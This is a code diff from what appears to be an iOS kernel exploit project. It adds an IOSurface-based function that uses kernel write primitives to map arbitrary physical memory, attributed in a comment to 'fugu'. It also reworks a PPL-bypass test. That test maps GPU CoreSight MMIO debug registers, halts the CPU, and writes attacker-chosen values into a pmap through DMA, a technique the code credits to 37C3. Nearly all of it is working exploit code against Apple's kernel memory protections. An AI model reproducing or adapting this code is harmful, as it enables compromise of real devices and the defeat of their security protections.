@@ -166,6 +166,62 @@ void ml_dbgwrap_unhalt_cpu_(uint64_t coresight_base_utt) {
     }
 }
 
+mach_port_t IO_GetSurfacePort(uint64_t magic)
+{
+    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
+        (__bridge NSString *)kIOSurfaceWidth : @120,
+        (__bridge NSString *)kIOSurfaceHeight : @120,
+        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
+    });
+    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
+    *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
+    IOSurfaceDecrementUseCount(surfaceRef);
+    CFRelease(surfaceRef);
+    return port;
+}
+
+uint64_t ipc_entry_lookup_(mach_port_name_t port_name) {
+    uint64_t pr_task = get_current_task();
+    uint64_t itk_space_pac = kread64_kfd(pr_task + off_task_itk_space);
+    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
+    uint32_t port_index = MACH_PORT_INDEX(port_name);
+    
+    uint64_t is_table = kread64_smr_kfd(itk_space + off_ipc_space_is_table);
+    uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
+    uint64_t object_pac = kread64_kfd(entry + off_ipc_entry_ie_object);
+    uint64_t object = object_pac | 0xffffff8000000000;
+    printf("object: 0x%llx\n", object);
+    
+    uint64_t kobject_pac = kread64_kfd(object + off_ipc_port_ip_kobject);
+    uint64_t kobject = kobject_pac | 0xffffff8000000000;
+    printf("ip_kobject: 0x%llx\n", kobject);
+    
+    return kobject;
+}
+
+
+//form fugu
+uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
+{
+    mach_port_t surfaceMachPort = IO_GetSurfacePort(1337);
+    uint64_t kobject = ipc_entry_lookup_(surfaceMachPort);
+    uint64_t surface = kread64_kfd(kobject + 0x18);
+    uint64_t desc = kread64_kfd(surface + 0x38);
+    uint64_t ranges = kread64_kfd(desc + 0x60);
+    kwrite64_kfd(ranges, phys);
+    kwrite64_kfd(ranges+8, size);
+    kwrite64_kfd(desc + 0x50, size);
+    kwrite64_kfd(desc + 0x70, 0);
+    kwrite64_kfd(desc + 0x18, 0);
+    kwrite64_kfd(desc + 0x90, 0);
+    kwrite8_kfd(desc + 0x88, 1);
+    uint32_t flags = kread32_kfd(desc + 0x20);
+    kwrite32_kfd(desc + 0x20,  (flags & ~0x410) | 0x20);
+    kwrite64_kfd(desc + 0x28, 0);
+    IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
+    return (uint64_t)IOSurfaceGetBaseAddress(mappedSurfaceRef);
+}
+
 //form 37c3
 void write_data_with_mmio(uint64_t kernel_p, uint64_t base6150000, uint64_t mask, uint64_t i, uint64_t pass) {
     uint64_t phys_addr = vtophys_kfd(kernel_p);
@@ -199,12 +255,14 @@ void write_32bit_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr
     write_data_with_mmio(kernel_p, base6150000, mask, i, (uint64_t)&_buf);
 }
 
-void  pplwrite_test(void)
-{
-    uint64_t vm_map = kread64_ptr_kfd(get_current_task() + 0x28/*off_task_map*/);
-    uint64_t pmap= kread64_ptr_kfd(vm_map + 0x40/*off_task_map_pmap*/);
-    uint64_t vm_map1 = kread64_ptr_kfd(get_kernel_task()+0x28/*off_task_map*/);
-    uint64_t pmap1= kread64_ptr_kfd(vm_map1 + 0x40/*off_task_map_pmap*/);
+void pplwrite_test(void) {
+    uint64_t pmap = get_current_pmap();
+    uint64_t ttbr0_va_kaddr = get_kernel_ttbr0va();
+    if(ttbr0_va_kaddr == 0)
+        ttbr0_va_kaddr = kread64_kfd(get_current_pmap() + off_pmap_tte);
+    uint64_t ttbr1_va_kaddr = get_kernel_ttbr1va();
+    if(ttbr1_va_kaddr == 0)
+        ttbr1_va_kaddr = kread64_kfd(get_kernel_pmap() + off_pmap_tte);
     
     dispatch_queue_t queue = dispatch_queue_create("com.example.my_queue", DISPATCH_QUEUE_SERIAL);
     dispatch_queue_set_specific(queue, CFRunLoopGetMain(), CFRunLoopGetMain(), NULL);
@@ -258,22 +316,21 @@ void  pplwrite_test(void)
                 return;
         }
         printf("base: %llx\n", base);
-        uint64_t  base23b7003c8 = (uint64_t)IOSurface_map(base,0x8);
+        uint64_t  base23b7003c8  = IO_GetMMAP(base,0x8);
         printf("base23b7003c8: %llx\n", base23b7003c8);
         printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
-        
-        uint64_t  base6040000= (uint64_t)IOSurface_map(0x206040000,0x100);  //GPU 协处理器的 CoreSight MMIO 调试寄存器块
+        uint64_t  base6040000 = IO_GetMMAP(0x206040000, 0x100);  //GPU 协处理器的 CoreSight MMIO 调试寄存器块
         printf("base6040000: %llx\n", base6040000);
-        uint64_t  base6140000= (uint64_t)IOSurface_map(0x206140000,0x200);
+        uint64_t  base6140000 = IO_GetMMAP(0x206140000, 0x200);
         printf("base6140000: %llx\n", base6140000);
-        uint64_t  base6150000= (uint64_t)IOSurface_map(0x206150000,0x100);
+        uint64_t  base6150000 = IO_GetMMAP(0x206150000, 0x100);
         printf("base6150000: %llx\n", base6150000);
-        uint64_t base6140008= base6140000+0x8; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
+        uint64_t base6140008  = base6140000 + 0x8; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
         printf("base6140008: %llx\n", base6140008);
-        uint64_t base6140108= base6140000+0x108; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
+        uint64_t base6140108  = base6140000 + 0x108; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
         printf("base6140108: %llx\n", base6140108);
         
-        uint64_t   original_value_0x206140108= *(uint64_t *)base6140108;
+        uint64_t   original_value_0x206140108 = *(uint64_t *)base6140108;
         printf("original_value_0x206140108: %llx\n", original_value_0x206140108);
         
         if ((~read_dword(base23b7003c8) & 0xF) != 0){
@@ -285,21 +342,24 @@ void  pplwrite_test(void)
                 }
             }
         }
-        uint64_t base6150020 = base6150000+0x20;
+        uint64_t base6150020 = base6150000 + 0x20;
         uint64_t base6150020_back = read_qword(base6150020);
+        printf("%llx\n", base6150020_back);
         if (isa15a16) write_qword(base6150020,1); // a15 a16需要
         ml_dbgwrap_halt_cpu_(base6040000);
-        dma_init_(base6140008,base6140108,original_value_0x206140108);
+        dma_init_(base6140008, base6140108, original_value_0x206140108);
         
-        uint64_t test_p=pmap+0x50;
-        write_data_with_mmio(test_p,base6150000,mask,i,0x4141414141414141);
+        uint64_t value = 0x8;
         
-        dma_done_(base6140008,base6140108,original_value_0x206140108);
+        uint64_t test_p = pmap + value;
+        write_data_with_mmio(test_p, base6150000, mask, i, 0x4141414141414141);
+        
+        sleep(2);
+        dma_done_(base6140008, base6140108, original_value_0x206140108);
         ml_dbgwrap_unhalt_cpu_(base6040000);
         
-        if (isa15a16) write_qword(base6150020,base6150020_back);
+        if (isa15a16) write_qword(base6150020, base6150020_back);
         uint64_t test= kread64_kfd(test_p);
-        printf("%llx  : %llx\n", test_p,test );
+        printf("%llx  : %llx\n", test_p, test);
     });
-    
 }
